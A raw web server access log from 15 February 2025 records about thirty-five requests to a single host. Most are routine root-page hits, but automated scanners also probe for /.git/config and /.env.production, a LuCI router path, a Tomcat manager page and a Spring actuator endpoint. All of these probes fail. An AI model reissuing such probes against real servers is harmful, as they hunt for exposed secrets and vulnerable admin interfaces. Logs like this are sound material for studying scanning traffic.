83.52.230.130 - - [15/Feb/2025:10:19:29 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
83.52.230.130 - - [15/Feb/2025:10:19:29 +0000] "GET /favicon.ico HTTP/1.1" 404 125 "http://193.93.76.135:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0"
141.255.166.90 - - [15/Feb/2025:10:42:04 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [15/Feb/2025:10:50:27 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
92.246.87.21 - - [15/Feb/2025:10:55:47 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.178.110.163 - - [15/Feb/2025:10:55:58 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC1\xC9\xA4\x99\xE6\xB3r*\x12m;\xE2'Gi\xA3\xE0M:\xC1\x8F (u\xC6\x04\xA993l+" 400 157 "-" "-"
195.178.110.163 - - [15/Feb/2025:10:55:58 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
195.178.110.163 - - [15/Feb/2025:10:55:58 +0000] "GET / HTTP/1.1" 200 146 "-" "l9tcpid/v1.1.0"
195.178.110.163 - - [15/Feb/2025:10:55:59 +0000] "GET /media/.git/config HTTP/1.1" 404 125 "-" "l9explore/1.2.2"
195.178.110.163 - - [15/Feb/2025:10:55:59 +0000] "GET /project/.git/config HTTP/1.1" 404 125 "-" "l9explore/1.2.2"
195.178.110.163 - - [15/Feb/2025:10:56:00 +0000] "GET /.env.production HTTP/1.1" 404 125 "-" "l9explore/1.2.2"
20.225.3.171 - - [15/Feb/2025:11:17:09 +0000] "GET /actuator/health HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
141.255.166.90 - - [15/Feb/2025:11:28:38 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
46.19.143.58 - - [15/Feb/2025:11:33:11 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
75.119.128.89 - - [15/Feb/2025:11:33:14 +0000] "GET / HTTP/1.0" 200 135 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122."
193.68.89.51 - - [15/Feb/2025:11:44:07 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
93.117.18.147 - - [15/Feb/2025:11:46:29 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
109.205.213.198 - - [15/Feb/2025:11:53:36 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.10 - - [15/Feb/2025:12:00:12 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [15/Feb/2025:12:13:14 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
40.118.214.175 - - [15/Feb/2025:12:18:15 +0000] "GET /manager/html HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
92.246.87.21 - - [15/Feb/2025:12:24:35 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:12:43:21 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [15/Feb/2025:13:04:31 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
46.19.143.58 - - [15/Feb/2025:13:24:43 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:13:26:08 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
64.62.197.38 - - [15/Feb/2025:13:34:01 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x91f\x15e\xD7>\xF8\xBB\xCDD\xCD\xB6\xA5\xADl\xD3\xEE\xC8D\xA1\xE7\xEB/\xA4\x01\x1D\x15d\xF9P\xE6>\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
193.68.89.10 - - [15/Feb/2025:13:48:43 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
141.255.166.90 - - [15/Feb/2025:13:50:36 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
92.246.87.21 - - [15/Feb/2025:13:51:53 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:14:27:14 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [15/Feb/2025:14:39:25 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
135.148.10.163 - - [15/Feb/2025:14:53:57 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
167.94.146.60 - - [15/Feb/2025:15:02:20 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
167.94.146.60 - - [15/Feb/2025:15:02:29 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
